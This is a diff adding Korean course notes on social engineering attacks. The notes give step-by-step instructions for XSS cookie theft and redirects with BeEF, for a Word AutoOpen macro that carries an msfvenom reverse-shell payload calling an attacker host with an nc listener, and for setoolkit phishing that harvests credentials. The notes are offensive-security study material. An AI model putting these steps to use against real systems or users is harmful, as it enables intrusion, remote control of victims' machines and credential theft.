@@ -1,0 +1,118 @@
+# CLASS101 chap-4
+
+사회공학기법
+
+⇒ 시스템의 취약점을 공략하는 것이 아닌, 사람의 취약점을 이용하여 공격
+
+즉, 시스템을 공격하는 것이 아닌, 시스템을 사용하는 사람을 속여 공격
+
+- XSS (Cross-Site Scripting)
+    
+    사회공학 기법 중 하나
+    
+    웹 서비스를 이용한 방법
+    
+    임의의 웹 사이트에 악성 스크립트를 심어둠 → 페이지 접속 시 악성 스크립트가 실행
+    
+    ex) <script>alert(’leesae’) </script>
+    
+    beef-xss 입력하면 beef 사용
+    
+    Hook: 악성 스크립트를 사용할 때, 해당 내용을 복사 후 사용함
+    
+    IP 부분에 나의 아이피를 입력
+    
+    → 글자 수 제한 문제가 발생
+    
+    개발자 도구를 켜기 → Elements 클릭 → message 검색 → max length를 수정
+    
+    이를 이용하여 댓글란 같은 부분에 악성 스크립트를 삽입
+    
+    beef를 통해 웹사이트에서 중요한 cookies를 확인 가능
+    
+    redirect 검색 후 redirect browser 클릭 후 redirect URL에 내가 원하는 주소 입력
+    
+    ⇒ excute 클릭 시, 공격자의 사이트로 이동하게 만들 수 있음
+    
+- word, execl 악성 스크립트 삽입
+    
+    파일 → 더보기 → 옵션 → 리본 사용자 지정 → 개발도구 체크
+    
+    개발도구 클릭 후 매크로 클릭
+    
+    파일 하나 생성
+    
+    구조 :
+    
+    Sub ~ End Sub 사이의 코드가 실행
+    
+    CreateObject (”Wscript.Shell’’).Run “calc.exe”
+    
+    → 계산기 프로그램을 실행하는 코드
+    
+    워드 파일이 실행되자마자 바로 계산기 코드를 실행하는 함수 두 가지
+    
+    1. Sub AutoOpen()
+        
+        test
+        
+        End Sub
+        
+    
+    ⇒ AutoOpen() ⇒ 워드 파일을 실행했을 때, test함수를 바로 실행해라
+    
+    이를 이용하여 악성 스크립트를 삽입
+    
+    칼리 리눅스 명령어
+    
+    msfvenom -a x64 —platform windows -p windows/x64/shell_reverse_tcp LHOST=[아이피] LPORT=[포트번호] -f vba-psh > res.txt
+    
+    -a x64 : 64비트 컴퓨터를 공격 
+    
+    —platform windows : 윈도우즈를 공격한다는 의미
+    
+    -p : 페이로드
+    
+    windows/x64/shell_reverse_tcp : 리버스 쉘의 페이로드를 생성
+    
+    LHOST : 공격자 아이피 (L = Listening)
+    
+    LPORT : 공격자 포트
+    
+    -f vba-psh : 악성코드를 vba 형식으로 출력하게 하라
+    
+    해당 파일을 복사 후 매크로에 붙여넣기
+    
+    nc -nlvp [포트번호]로 포트 개방 후 워드 실행 시, 윈도우의 쉘 접근
+    
+- 피싱 공격
+    
+    사회공격 기법 중 꽃
+    
+    사람을 낚는다 == 속이다
+    
+    사용하는 사이트와 똑같이 만들어둔 사이트
+    
+    해당 사이트를 뿌려 로그인하게 만드는 것
+    
+    입문자의 관점 하에 가짜 사이트를 만드는 툴을 이용
+    
+    ⇒ setoolkit : se툴킷 이라고도 함 (사회공학 기법 공격을 하기위한 도구 모음)
+    
+    se : Social Engineering 
+    
+    setoolkit 입력 후 1번 Social-Engineering Attack (사회공학 기법 공격) 선택
+    
+    Website Attack Vectors : 웹사이트를 공격하기 위해 선택
+    
+    Credential Harvester Attack : 재정 정보 (아이디, 비밀번호를 뜻함)
+    
+    이후 웹 사이트를 어떻게 만들것이냐
+    
+    기존 웹 사이트 복사
+    
+    URL를 주는 방식
+    
+    직접 만들기
+    
+    복사 후 해당 링크에 로그인을 하면 쉘 창에 아이디 비밀번호 입력한 그대로 확인 가능
